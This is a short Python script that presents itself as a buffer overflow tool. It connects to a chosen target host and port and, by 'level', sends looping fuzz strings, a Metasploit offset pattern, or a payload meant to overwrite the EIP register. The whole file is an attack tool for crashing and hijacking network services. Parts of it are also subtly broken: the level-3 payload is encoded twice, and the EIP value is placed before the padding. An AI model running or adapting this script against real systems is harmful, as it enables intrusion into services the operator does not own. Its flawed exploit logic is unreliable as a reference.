# !/usr/bin/python2
# zwerd buffer overflow tool
import sys
import argparse
import socket
import time
import subprocess

def send_payload(target, port, payload):
    try:
        # Create a socket object
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Connect to the target
        s.connect((target, port))
        # Send the payload
        s.sendall(payload.encode())
        # Close the connection
        s.close()
        return True
    except Exception as e:
        print("Error:", e)
        return False

def main():
    # Create argument parser
    parser = argparse.ArgumentParser(description="Buffer overflow tester")
    # Add arguments
    parser.add_argument("-l", "--level", type=int, help="Level of overflow testing")
    parser.add_argument("-t", "--target", type=str, help="Target IP address")
    parser.add_argument("-p", "--port", type=int, help="Target port number")
    parser.add_argument("-s", "--string", type=str, help="String to send")
    parser.add_argument("-L", "--length", type=int, help="Length of string (optional)", default=1)
    parser.add_argument("-loop", "--loop", action="store_true", help="Enable loop mode")
    parser.add_argument("-d", "--delay", type=float, help="Delay between loops (in seconds)", default=1.0)
    parser.add_argument("-q", "--eip", type=str, help="Value to overwrite EIP")
    parser.add_argument("-o", "--offset", type=str, help="Offset value (optional)")

    # Parse arguments
    args = parser.parse_args()

    if args.level == 1:
        try:
            print("[*] Starting Zwerd Buffer Overflow Killer")
            print("[*] Setup the server address and port number")
            print("[*] Creating the buffer payload")
            loop_counter = 0
            while True:
                loop_counter += 1
                # Multiply the string according to the length
                payload = args.string * (args.length * loop_counter if args.loop else args.length)
                print("[*] Sending evil buffer (loop {}): {} in length of {}".format(loop_counter, args.string, len(payload)))
                # Send the payload
                if not send_payload(args.target, args.port, payload):
                    break
                time.sleep(args.delay)  # Add delay between loops
        except KeyboardInterrupt:
            print("\nCtrl+C detected. Stopping...")
            sys.exit(0)
    
    elif args.level == 2:
        try:
            print("[*] Starting Zwerd Buffer Overflow Killer")
            print("[*] Setup the server address and port number")
            print("[*] Generating pattern using msf-pattern_create")
            # Generate pattern using msf-pattern_create
            pattern_process = subprocess.Popen(["msf-pattern_create", "-l", str(args.length)], stdout=subprocess.PIPE)
            pattern_output, _ = pattern_process.communicate()
            pattern = pattern_output.decode().strip()
            print("[*] Generated pattern:")
            print(pattern)
            # Send the payload
            print("[*] Sending pattern to the target")
            send_payload(args.target, args.port, pattern)
            print("[*] Pattern sent. Exiting...")
        except Exception as e:
            print("Error:", e)
            sys.exit(1)
    elif args.level == 3:
        try:
            print("[*] Starting Zwerd Buffer Overflow Killer")
            print("[*] Setup the server address and port number")
            print("[*] Creating buffer payload to overwrite EIP")

            if args.offset:
                offset = args.offset.encode()
                payload = args.eip.encode() + offset * ((args.length - len(args.eip)) // len(offset))
                payload += offset[:((args.length - len(args.eip)) % len(offset))]
            else:
                payload = args.eip.encode() + b"A" * (args.length - len(args.eip))

            # Send the payload
            print("[*] Sending payload to the target")
            send_payload(args.target, args.port, payload)
            print("[*] Payload sent. Exiting...")
        except Exception as e:
            print("Error:", e)
            sys.exit(1)
    else:
        print("Invalid level. Level 1 is required for buffer overflow testing.")

if __name__ == "__main__":
    main()
